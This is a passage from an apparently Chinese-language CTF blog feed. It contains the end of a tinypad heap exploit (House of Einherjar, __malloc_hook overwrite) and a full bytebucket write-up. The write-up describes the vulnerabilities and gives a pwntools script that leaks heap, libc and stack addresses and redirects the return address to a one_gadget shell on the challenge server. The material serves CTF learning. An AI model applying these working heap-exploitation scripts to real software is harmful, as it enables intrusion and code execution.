class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pdb<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_memo</span>(<span class="hljs-params">p, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(SIZE)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;(CONTENT)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_memo</span>(<span class="hljs-params">p, idx</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;D&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(INDEX)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_memo</span>(<span class="hljs-params">p, idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;E&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;(INDEX)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&quot;(CONTENT)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">&quot;(Y/n)&gt;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;Y&quot;</span>)<br><br><br>p = process(<span class="hljs-string">&quot;./tinypad&quot;</span>)<br><br><span class="hljs-comment"># 第一步： 利用UAF泄露heap地址和libc基址</span><br>add_memo(p, <span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x10</span>) <span class="hljs-comment"># fast chunk</span><br>add_memo(p, <span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;B&quot;</span> * <span class="hljs-number">0x10</span>) <span class="hljs-comment"># fast chunk</span><br>add_memo(p, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">0x10</span>) <span class="hljs-comment"># unsorted chunk</span><br>add_memo(p, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;D&quot;</span> * <span class="hljs-number">0x10</span>)<br><br>delete_memo(p, <span class="hljs-number">3</span>)<br>delete_memo(p, <span class="hljs-number">2</span>)<br>delete_memo(p, <span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;INDEX: 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CONTENT: &quot;</span>)<br>addr_heap = u64(p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;addr_heap: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_heap))<br><br>p.recvuntil(<span class="hljs-string">&quot;INDEX: 3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;CONTENT: &quot;</span>)<br>addr_unsorted_bin = u64(p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;addr_unsorted_bin: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_unsorted_bin))<br>addr_libc = addr_unsorted_bin - <span class="hljs-number">0x3c4b78</span>  <span class="hljs-comment"># Fix You</span><br>log.success(<span class="hljs-string">&quot;addr_libc: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_libc))<br>addr_malloc_hook = addr_libc + <span class="hljs-number">0x3C4B10</span>  <span class="hljs-comment"># Fix You</span><br>addr_fake_fastchunk = addr_malloc_hook - <span class="hljs-number">0x23</span><br>one_gadget = addr_libc + <span class="hljs-number">0xf1147</span>  <span class="hljs-comment"># 该one_gadget需满足[rsp+0x70] == NULL   # Fix You</span><br><br><span class="hljs-comment"># 第二步： 利用House Of Einherjar构造overlapping chunk</span><br>add_memo(p, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;C&quot;</span> * <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># use unsorted chunk (index: 1)</span><br>add_memo(p, <span class="hljs-number">0x60</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xd0</span>) + p64(addr_heap - <span class="hljs-number">0x60</span>) + p64(addr_heap - <span class="hljs-number">0x60</span>))  <span class="hljs-comment"># fake chunk (index: 2)</span><br>add_memo(p, <span class="hljs-number">0x68</span>, <span class="hljs-string">&quot;B&quot;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0xd0</span>))  <span class="hljs-comment"># off-by-one (index: 3, will be overlapping chunk)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;此时堆从低地址到高地址的分布：  </span><br><span class="hljs-string">fake chunk                  --   AAAA  ----  (index: 2)</span><br><span class="hljs-string">用于执行off-by-one的chunk     --   BBBB  ----  (index: 3)</span><br><span class="hljs-string">用于free的chunk              --   CCCC  ----  (index: 1)</span><br><span class="hljs-string">靠top chunk的chunk           --   DDDD  ----  (index: 4)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>delete_memo(p, <span class="hljs-number">1</span>)  <span class="hljs-comment"># free to consolidate backward</span><br>delete_memo(p, <span class="hljs-number">3</span>)  <span class="hljs-comment"># add this overlapping chunk to fastbin</span><br><br><span class="hljs-comment"># 第三步： 覆盖fastbin上的chunk的fd指针，指向__malloc_hook附近区域</span><br>add_memo(p, <span class="hljs-number">0x90</span>, <span class="hljs-string">&quot;E&quot;</span> * <span class="hljs-number">0x50</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(addr_fake_fastchunk)) <span class="hljs-comment"># (index: 1)</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">因为最多只能有4个memo，这里需要删除一个，后面才能申请到两个memo</span><br><span class="hljs-string">这里不能调delete_memo(p, 4)， 因为要释放调这个靠top chunk的chunk，其会跟top chunk合并，下面的size变量会加上top chunk的大小，从而满足下面的条件</span><br><span class="hljs-string">if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="hljs-string">  if (have_fastchunks(av))</span><br><span class="hljs-string">malloc_consolidate(av);</span><br><span class="hljs-string">...</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">就会调用到malloc_consolidate函数。而在这个函数里处理fastbin chunk时会调用到unlink，而unlink时会检查被unlink的chunk的size和prev_size，这个检查通不过。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>delete_memo(p, <span class="hljs-number">1</span>) <br><br>add_memo(p, <span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;F&quot;</span> * <span class="hljs-number">0x10</span>) <span class="hljs-comment"># (index: 1)</span><br>add_memo(p, <span class="hljs-number">0x60</span>, <span class="hljs-string">&quot;X&quot;</span> * (addr_malloc_hook - addr_fake_fastchunk - <span class="hljs-number">0x10</span>) + p64(one_gadget)) <span class="hljs-comment"># (index: 2)</span><br><br><br><span class="hljs-comment"># 第四步： 调用malloc， 触发one_gadget</span><br>delete_memo(p, <span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;(CMD)&gt;&gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;A&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;(SIZE)&gt;&gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>运行上面的脚本前需根据自己的libc版本来修改几个硬编码值，脚本里用<code>Fix You</code>标注出。<br>附：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_einherjar/#2016-seccon-tinypad">这里</a>有个思路是跟上面稍微有些不同</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hackme inndy bytebucket题目</title>
    <link href="/2019/01/09/ctf-hackme-inndy-bytebucket/"/>
    <url>/2019/01/09/ctf-hackme-inndy-bytebucket/</url>
    
    <content type="html"><![CDATA[<p>题目链接：<a href="https://hackme.inndy.tw/scoreboard/">https://hackme.inndy.tw/scoreboard/</a> （随便输个名字登录即可看到题目列表）</p><p>下载bytebucket文件，checksec下：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-string">PIE</span> <span class="hljs-string">enabled</span><br></code></pre></div></td></tr></table></figure><h4 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h4><p>基本功能是增删改查bucket，一个bucket对应多个slot。bucket结构体：</p><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><span class="hljs-number">0</span>x8字节      ： 下一个bucket的地址<br><span class="hljs-number">0</span>x8字节      ： slot_count<br><span class="hljs-number">0</span>x10字节     ： bucket_name<br><span class="hljs-number">0</span>x8 * <span class="hljs-built_in">n</span>字节  ： <span class="hljs-built_in">n</span>个slot地址<br></code></pre></div></td></tr></table></figure><p>有下面几个操作：</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>. Make <span class="hljs-keyword">bucket </span> 插入一个<span class="hljs-keyword">bucket到buckets链中，给该bucket填充slot。这条bucktes链的链头地址存在0x203148处（g_bucket_head），在0x203140处存储当前指向的bucket(g_bucket_current)。</span><br><span class="hljs-keyword"></span><span class="hljs-number">2</span>. List <span class="hljs-keyword">bucket</span><br><span class="hljs-keyword"></span><span class="hljs-number">3</span>. Find <span class="hljs-keyword">bucket </span> 通过<span class="hljs-keyword">bucket_name找到bucket，并用g_bucket_current指向该bucket</span><br><span class="hljs-keyword"></span><span class="hljs-number">4</span>. Next <span class="hljs-keyword">bucket </span> <br><span class="hljs-number">5</span>. Drop <span class="hljs-keyword">bucket</span><br><span class="hljs-keyword"></span><span class="hljs-number">6</span>. Open <span class="hljs-keyword">bucket </span> 打开g_bucket_current指向的<span class="hljs-keyword">bucket，可打印、编辑、删除slot，重命名bucket</span><br><span class="hljs-keyword"></span><span class="hljs-number">7</span>. Sort <span class="hljs-keyword">bucket</span><br><span class="hljs-keyword"></span><span class="hljs-number">8</span>. Exit <span class="hljs-keyword">bucket</span><br></code></pre></div></td></tr></table></figure><p>程序开始新建了两个bucket：</p><figure class="highlight xl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xl">--- List of Buckets ---<br>B<span class="hljs-function"><span class="hljs-title">ucket</span>[1]-&gt;</span><span class="hljs-keyword">name</span> = <span class="hljs-string">&quot;/root/locked&quot;</span>;   <span class="hljs-comment">// 这个bucket有个slot即第一个flag，第二个flag通过需shell来获取</span><br>B<span class="hljs-function"><span class="hljs-title">ucket</span>[2]-&gt;</span><span class="hljs-keyword">name</span> = <span class="hljs-string">&quot;/home/ctf/flag&quot;</span>;<br></code></pre></div></td></tr></table></figure><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><ol><li>在读取用户输入的字符串时，可以让其不在末尾拼接\x00（<code>sub_EA8</code>函数和<code>sub_CBA</code>函数），导致可以通过printf泄露出heap地址。如：输入0x10长度的bucket_name再List bucket输出可泄露堆地址；输入0x100长的字符可打印出g_bucket_current的值， 即泄露堆地址。</li><li>make bucket操作：新建的bucket内存，并不清零，而当用户输入的slot大小为0时，其也不把slot地址置0，也就是如果在这个slot处我们先放入一个地址值，我们就可以通过操作这个slot来读写这个地址指向的内存。可以利用其泄露libc地址，泄露栈地址，达到UAF，覆盖某个bucket的下一个bucket的地址等。</li></ol><h4 id="pwn脚本"><a href="#pwn脚本" class="headerlink" title="pwn脚本"></a>pwn脚本</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pdb<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_bucket</span>(<span class="hljs-params">p, bucket_name, slot_datas</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Size of bucket &gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(slot_datas)))  <span class="hljs-comment"># slot_count</span><br>    p.recvuntil(<span class="hljs-string">&quot;Name of bucket &gt;&gt;&quot;</span>)<br>    p.sendline(bucket_name)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(slot_datas)):<br>        p.recvuntil(<span class="hljs-string">&quot;Size of content &gt;&gt;&quot;</span>)<br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(slot_datas[i])))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(slot_datas[i]) &gt; <span class="hljs-number">0</span>:<br>            p.recvuntil(<span class="hljs-string">&quot;Content of slot &gt;&gt;&quot;</span>)<br>            p.send(slot_datas[i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_bucket</span>(<span class="hljs-params">p, bucket_name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Bucket name to find &gt;&gt;&quot;</span>)<br>    p.sendline(bucket_name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drop_bucket</span>(<span class="hljs-params">p</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br><span class="hljs-comment">## run using my libc.so</span><br><span class="hljs-comment"># env = &#123;&quot;FLAG1&quot;: &quot;flag&#123;flag1&#125;&quot;&#125;</span><br><span class="hljs-comment"># p = process(&quot;./bytebucket2&quot;, env=env)</span><br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><br><span class="hljs-comment">## </span><br><span class="hljs-comment"># env = &#123;&quot;FLAG1&quot;: &quot;flag&#123;flag1&#125;&quot;, &quot;LD_PRELOAD&quot; : &quot;/root/pwnfile/inndy_libc-2.23.so.x86_64&quot;&#125;</span><br><span class="hljs-comment"># p = process(&quot;./bytebucket2&quot;, env=env)</span><br>p = remote(<span class="hljs-string">&quot;hackme.inndy.tw&quot;</span>, <span class="hljs-number">7722</span>)<br>libc = ELF(<span class="hljs-string">&quot;/root/pwnfile/inndy_libc-2.23.so.x86_64&quot;</span>)<br><br><br><span class="hljs-comment"># Step1: leak heap addr</span><br>make_bucket(p, <span class="hljs-string">&quot;PPP&quot;</span>, [<span class="hljs-string">&#x27;pppp&#x27;</span>])  <span class="hljs-comment"># 增加栈地址，避免要打印出的栈地址为0xXXXXXXXX00YY，打印该地址时会\x00截断，从而只输出0xYY</span><br>make_bucket(p, <span class="hljs-string">&quot;QQQ&quot;</span>, [<span class="hljs-string">&#x27;qqqq&#x27;</span>])<br>find_bucket(p, <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x100</span>)  <span class="hljs-comment"># 会输入0x100个字符到0x203040，printf打印0x203040的值时就会打印出跟在它后面的0x203140处的值，即g_bucket_current的值</span><br>p.recvuntil(<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">0x100</span>)<br>addr_heap = u64(p.recvuntil(<span class="hljs-string">&#x27;&quot;&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;addr_heap: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_heap))<br>addr_flag1 = addr_heap - <span class="hljs-number">0x100</span><br><br><span class="hljs-comment"># Step2: get flag1</span><br>payload = [p64(addr_flag1) * <span class="hljs-number">0x30</span>]  <span class="hljs-comment"># 先在堆上布置flag1的地址</span><br>make_bucket(p, <span class="hljs-string">&quot;AAA&quot;</span>, payload)<br>drop_bucket(p)<br><br>make_bucket(p, <span class="hljs-string">&quot;BBB&quot;</span>, [<span class="hljs-string">&quot;bbbb&quot;</span>])<br>make_bucket(p, <span class="hljs-string">&quot;CCC&quot;</span>, [<span class="hljs-string">&quot;&quot;</span>])  <span class="hljs-comment"># let size of slot content be zero</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;6&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)  <span class="hljs-comment"># 打印CCC这个bucket的slot，该slot就是flag1的地址</span><br>p.recvuntil(<span class="hljs-string">&quot;Row[0]:&quot;</span>)<br>flag1 = p.recvuntil(<span class="hljs-string">&quot;+---&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>log.success(<span class="hljs-string">&quot;flag1: &quot;</span> + flag1)<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br><br><span class="hljs-comment"># Step3: leak libc addr</span><br>addr_free_chunk = addr_heap + <span class="hljs-number">0x150</span><br>payload = [p64(addr_free_chunk) * <span class="hljs-number">0x30</span>]<br>make_bucket(p, <span class="hljs-string">&quot;DDD&quot;</span>, payload)<br>make_bucket(p, <span class="hljs-string">&quot;EEE&quot;</span>, [<span class="hljs-string">&quot;eeee&quot;</span>])  <span class="hljs-comment"># near top chunk</span><br><br>find_bucket(p, <span class="hljs-string">&quot;DDD&quot;</span>)<br>drop_bucket(p)<br>make_bucket(p, <span class="hljs-string">&quot;FFF&quot;</span>, [<span class="hljs-string">&quot;ffff&quot;</span>])<br>make_bucket(p, <span class="hljs-string">&quot;GGG&quot;</span>, [<span class="hljs-string">&quot;&quot;</span>])  <span class="hljs-comment"># let size of slot content be zero</span><br><br><br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;6&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Row[0]:&quot;</span>)  <span class="hljs-comment"># 打印CCC这个bucket的slot，该slot值指向一个unsorted bin chunk，打印该slot就泄露出unsorted bin地址，再计算出libc基址</span><br>addr_unsorted_bin = u64(p.recvuntil(<span class="hljs-string">&quot;+---&quot;</span>, drop=<span class="hljs-literal">True</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;addr_unsorted_bin: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_unsorted_bin))<br>addr_libc = addr_unsorted_bin - <span class="hljs-number">0x3c3b78</span> <span class="hljs-comment"># fix it. In my libc: 0x3c4b78</span><br>log.success(<span class="hljs-string">&quot;addr_libc: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_libc))<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br><span class="hljs-comment"># at this moment, we have a unsorted bin chunk(size: 0x140)</span><br><br><span class="hljs-comment"># Step4: leak stack addr by environ</span><br>addr_environ = addr_libc + libc.symbols[<span class="hljs-string">&quot;environ&quot;</span>]<br>addr_system = addr_libc + libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br><br>make_bucket(p, <span class="hljs-string">&quot;HHH&quot;</span>, [p64(addr_environ) * <span class="hljs-number">0x20</span>])<br>drop_bucket(p)<br>make_bucket(p, <span class="hljs-string">&quot;III&quot;</span>, [<span class="hljs-string">&quot;iiii&quot;</span>])<br>make_bucket(p, <span class="hljs-string">&quot;JJJ&quot;</span>, [<span class="hljs-string">&quot;&quot;</span>])  <span class="hljs-comment"># let size of slot content be zero</span><br><br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;6&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Row[0]:&quot;</span>)<br>addr_stack = u64(p.recvuntil(<span class="hljs-string">&quot;+---&quot;</span>, drop=<span class="hljs-literal">True</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;addr_stack: &quot;</span> + <span class="hljs-built_in">hex</span>(addr_stack))<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br><span class="hljs-comment"># at this moment, we have a unsorted bin chunk(size: 0xc0)</span><br><br><span class="hljs-comment"># Step 5: modify ret to one_gadget</span><br>addr_ret = addr_stack - <span class="hljs-number">0xf0</span><br><span class="hljs-comment"># 该one_gadget需满足[rsp+0x70] == NULL</span><br>addr_one_gadget = addr_libc + <span class="hljs-number">0xf0897</span> <span class="hljs-comment"># fix it. In my libc: 0xf1147</span><br>make_bucket(p, <span class="hljs-string">&quot;KKK&quot;</span>, [<span class="hljs-string">&quot;k&quot;</span>] * <span class="hljs-number">4</span>)  <span class="hljs-comment"># consume the unsorted bin chunk</span><br><br>make_bucket(p, <span class="hljs-string">&quot;LLL&quot;</span>, [p64(addr_ret) * <span class="hljs-number">0x30</span>])<br>make_bucket(p, <span class="hljs-string">&quot;MMM&quot;</span>, [<span class="hljs-string">&quot;mmmm&quot;</span>])  <span class="hljs-comment"># near top chunk</span><br><br>find_bucket(p, <span class="hljs-string">&quot;LLL&quot;</span>)<br>drop_bucket(p)<br><br>make_bucket(p, <span class="hljs-string">&quot;NNN&quot;</span>, [<span class="hljs-string">&quot;nnnn&quot;</span>])<br>make_bucket(p, <span class="hljs-string">&quot;OOO&quot;</span>, [<span class="hljs-string">&quot;&quot;</span>])  <span class="hljs-comment"># let size of slot content be zero</span><br><br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;6&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)  <span class="hljs-comment"># edit data</span><br>p.recvuntil(<span class="hljs-string">&quot;Which line of data &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size of new content &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;New content &gt;&gt;&quot;</span>)<br>p.send(p64(addr_one_gadget)[:<span class="hljs-number">5</span>])<br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br><br><br><span class="hljs-comment"># Step 6: exit to execute one_gadget</span><br>p.recvuntil(<span class="hljs-string">&quot;What to do &gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)<br><br>p.interactive()<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
